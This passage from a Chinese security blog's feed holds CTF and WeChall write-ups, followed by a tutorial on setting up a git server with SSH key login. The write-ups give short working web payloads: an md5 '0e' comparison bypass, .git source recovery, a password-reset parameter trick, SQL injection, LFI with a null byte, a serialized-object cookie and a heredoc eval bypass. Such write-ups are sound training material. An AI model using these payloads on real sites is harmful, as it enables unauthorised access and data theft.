<h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
<h2 id="web1_200">web1 200</h2><p>这题是大JAVA的题目,  可惜并不会,, 就是有个一个SessionExample界面, 可以进行设置session, (为啥需要这种东西?)<br>然后设置, login=true, user=Administrator</p>
<h2 id="web2_系列-">web2 系列..</h2><p>P神出的代码审计4连套, PS: P神写的站, 给你代码你也日不动~~<br>只搞定两题..</p>
<h3 id="web2_200">web2 200</h3><p>第一步是搞到源码, 题目里说了用git管理源码, 所以应该是.git 泄露了… 访问 /.git 403, 果然是….</p>
<p>去百度后下载了 <code>rip-git.pl</code> ,拖/.git, 拖下来了, 却不能还原源码, 估计有些重要的没拖下来..</p>
<p>接下来是:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout master</span><br><span class="line"><span class="variable">$ </span>git checkout -f</span><br></pre></td></tr></table></figure></p>
<p>搞出来了个 <code>README.md</code><br>根据里面的提示, 去网站上搞到了个 /.git/refs/tags/1.0<br>然后把 /.git/refs/heads/master 的hash 值用 /tags/1.0 里的hash替换<br>再 <code>$ git checkout -f</code><br>然后就搞到源码了, 第一个200的flag就在index.php里..</p>
<h3 id="web2_100">web2 100</h3><p>存在强制修改任意用户密码漏洞, 管理员邮箱在首页: xdsec-cms@xdctf.com<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="link_url">http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&amp;verify</span>[<span class="link_label">1</span>]=aa</span><br></pre></td></tr></table></figure></p>
<p>修改密码后登录, get 100 flag…</p>
<p>后面就日不动了,,, 毕竟P神…<br>XDCTF的web题质量都挺高的…学到了很多..</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WeChall Writeup]]></title>
    <link href="http://0x48.pw/2015/08/07/0x06/"/>
    <id>http://0x48.pw/2015/08/07/0x06/</id>
    <published>2015-08-07T09:01:53.000Z</published>
    <updated>2016-03-28T10:23:57.478Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
</blockquote>
<a id="more"></a>
<h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
<h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
<h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
<h2 id="0x03_Training:_Register_Globals">0x03 Training: Register Globals</h2><p>全局变量的问题,,上次看到过,,不过现在的php已经没这漏洞了…(PHP还是那么老版本的活该..)<br>payload: <code>globals.php?login[]=admin</code></p>
<h2 id="0x04_Are_you_serial">0x04 Are you serial</h2><p>这个有点屌…放代码吧..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoloader</span><span class="params">(<span class="variable">$classname</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./'</span>.str_replace(<span class="string">'.'</span>, <span class="string">''</span>, <span class="variable">$classname</span>).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cece</span><span class="params">(<span class="variable">$name</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'cece'</span>);</span><br><span class="line"> <span class="comment">#spl_autoload_register('my_autoloader');</span></span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="string">'O:7:"phpinfo":0:&#123;&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
<p>这题的重点就在于 <code>spl_autoload_register</code> 这个函数.<br>解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到 (<code>sql_autoload_register(xxx)</code>) xxx函数中.<br>这题只要能运行 <code>SERIAL_Solution.php</code> 这个文件就算成功</p>
<p>所以最后的payload是改cookie,<br><code>serial_user</code> 的值为 <code>O:15:&quot;SERIAL_Solution&quot;:0:{}</code></p>
<h2 id="0x05_PHP_0819">0x05 PHP 0819</h2><p>第一次知道php还有这鬼东西….heredoc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;suibian</span><br><span class="line">正文</span><br><span class="line">正文</span><br><span class="line">suibian;</span></span><br><span class="line"><span class="comment">// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;</span></span><br></pre></td></tr></table></figure>
<p>这题的目的 <code>eval(&quot;\$spaceone=&#39;1337&#39;;&quot;);</code><br>但是引号都被过滤了…所以就可以用上面的那个代替引号…这里由于<code>eval</code>的原因, 结尾还要再来一个换行<br>payload: <code>index.php?eval=&lt;&lt;&lt;r%0a1337%0ar;%0a</code></p>
<h2 id="0x06_HOST_me">0x06 HOST me</h2><p>这题一看就知道是去改host, 不过比较坑….改成 <code>host:localhost</code> 后会报错…纠结了好久..<br>网上查了以下才知道…需要….<br>payload:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只把要修改的行列出来</span></span><br><span class="line">GET <span class="string">http:</span><span class="comment">//www.wechall.net/challenge/space/host_me/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost</span><br></pre></td></tr></table></figure></p>
<h2 id="0x07_PHP_0815">0x07 PHP 0815</h2><p>这题有点屌…这题的大概意思是它给你的代码存在sqli, 然后让你给出修补的方案, 要给出最短, 还不会影响原程序的方案…<br>表示并不会, 只看出了应该是修改 <code>in_array</code> 这里..<br>到网上搜索后才知道, 需要把 <code>$show</code> 转换为int 型, 有 <code>int()</code> 和 <code>intval()</code> 然而答案要最短,<br>最短的黑魔法…. —&gt; <code>$show - 0</code><br>提交 <code>in_array($show-0, $whitelist)</code> 竟然不对…坑爹的…最后提交 <code>-0</code> 过了..</p>
<p>最后, 我在想,, 这脚本有sqli? 怎么日? ….然后试了一下…果然有…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code.php?show=1%20union%20select%201%23</span></span><br><span class="line">Query: SELECT <span class="number">1</span> FROM `table` WHERE `id`=<span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br><span class="line">SHOWING NUMBER <span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<!--## 0x08 Stop us-->
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Wechall" scheme="http://0x48.pw/tags/Wechall/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git小记]]></title>
    <link href="http://0x48.pw/2015/07/22/0x04/"/>
    <id>http://0x48.pw/2015/07/22/0x04/</id>
    <published>2015-07-22T12:30:25.000Z</published>
    <updated>2016-03-28T10:24:28.542Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
</blockquote>
<a id="more"></a>
<p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
<p>之后，既可以做服务端，可以做客户端。</p>
<h1 id="服务端">服务端</h1><p>如果想使用git做服务端，第一步就是创建git用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure>
<p>然后就是创建版本库了，比如，我准备把仓库<code>test</code>放在<code>/home/wwwroot/</code>下，则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot</span><br><span class="line">$ mkdir <span class="built_in">test</span></span><br><span class="line">$ sudo git init --bare <span class="built_in">test</span> </span><br><span class="line">$ sudo chown -R git:git <span class="built_in">test</span>    <span class="comment">#这句要在创建仓库后再使用</span></span><br></pre></td></tr></table></figure></p>
<p>这里有个要说明下，<code>--base</code> 参数是不把项目原文件放在仓库目录下，而是以另一种形式储存，也就是说，如果你把 <code>a.php</code> 文件上传到git仓库，则你在 <code>test</code> 文件夹中根本找不到 <code>a.php</code> 这个文件。</p>
<p>如果不加 <code>--bare</code> 参数，会出现一系列问题，现在我还没研究透，待我研究透侧了，再来补充。</p>
<p>这样服务端基本配置就好了，接下来就是客户端了。。</p>
<h1 id="附">附</h1><p>这里先假设一些东西，</p>
<blockquote>
<ol>
<li>服务器的ip是: 192.168.110.110</li>
<li>客户端1把项目储存在 ‘/home/wwwroot/default/test’ 目录下</li>
<li>把项目放在web服务器上 ‘/home/wwwroot/test.com’ 目录中，让外网访问<br>则</li>
</ol>
</blockquote>
<h1 id="客户端1">客户端1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/default</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line">   <span class="comment"># 输入密码（免输入密码的方法我加在结尾的Other中）</span></span><br></pre></td></tr></table></figure>
<p>现在 <code>/home/wwwroot/default/test</code> 就是你的工作目录，或者可以把 <code>/test/.git</code>文件夹移到你的工作目录下。。</p>
<p>然后就是在有 <code>.git</code> 文件夹下，输入下面命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .                <span class="comment">#当前目录下的所以文件加入到版本库中，如果不像所有，可以 git add 具体文件</span></span><br><span class="line">$ git commit -m <span class="string">"这里你自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<p>上面这是在第一次提交文件，或者git仓库是空的情况下，假如是第二次提交，或者版本库中以有内容，则是。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -am <span class="string">"自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<h1 id="web服务器">web服务器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/test.com</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line"> <span class="comment"># 输入密码</span></span><br></pre></td></tr></table></figure>
<p>当客户端1的项目更新提交了后，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="Other">Other</h1><h2 id="免密码">免密码</h2><p>这里git文件传送使用的是ssh，所以其实也是ssh免输入密码的方式。<br>首先，编辑 <code>/etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br><span class="line">AuthorizedKeysFile	.ssh/authorized_keys      <span class="comment">#这句前面的#号去了</span></span><br></pre></td></tr></table></figure>
<p>在客户端上使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -P <span class="string">''</span></span><br><span class="line"> <span class="comment"># 则会在 ~/.ssh/ 目录下生产 id_rsa 和 id_rsa.pub..  这个就是传说中rsa加密的公钥和私钥</span></span><br></pre></td></tr></table></figure></p>
<p>把 <code>id_rsa.pub</code> 文件中的内容复制，粘贴到服务端 <code>~/.ssh/authorized_keys</code> 中</p>
<p><code>authorized_keys</code>文件的权限必须是644<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls -al</span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root  authorized_keys</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="GIT" scheme="http://0x48.pw/tags/GIT/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
</feed>